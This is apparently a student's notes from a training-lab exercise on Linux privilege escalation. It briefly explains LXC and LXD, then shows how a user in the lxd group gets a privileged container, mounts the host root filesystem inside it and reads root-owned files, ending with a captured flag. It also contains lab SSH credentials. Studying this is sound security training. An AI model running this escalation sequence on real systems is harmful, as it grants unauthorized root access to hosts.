# Containers

Containers operate at the operating system level and virtual machines at the hardware level. 

## Linux Containers

Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. 

## Linux Daemon

Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. 

id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

--> either create our own container and transfer it to the target system or use an existing container

cd ContainerImages
ls
ubuntu-template.tar.xz

lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+

lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root

## LAB

ssh htb-student@10.129.177.220
HTB_@cademy_stdnt!

id
uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)

cd ContainerImages
ls
alpine-v3.18-x86_64-20230607_1234.tar.gz

lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpinetest

lxc image list
+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|   ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpinetest | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Jan 23, 2024 at 6:54pm (UTC) |
+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+

lxc init alpinetest privesc -c security.privileged=true
Creating privesc

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

lxc start privesc
lxc exec privesc /bin/bash

Error: Command not found


cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

lxc init alpinetest privesc2 -c security.privileged=true
Creating privesc2

lxc config device add privesc2 host-root disk source=/ path=/root recursive=true
Device host-root added to privesc2

lxc start privesc2
lxc exec privesc2 /bin/bash

Error: Command not found

lxc launch privesc

lxc exec privesc -- sh -c "cd /tmp && pwd"

lxc start privesc

lxc-attach -n privesc
--> Failed

lxc exec privesc /bin/sh
cat /mnt/root/root/flag.txt
HTB{C0nT41n3rs_uhhh}
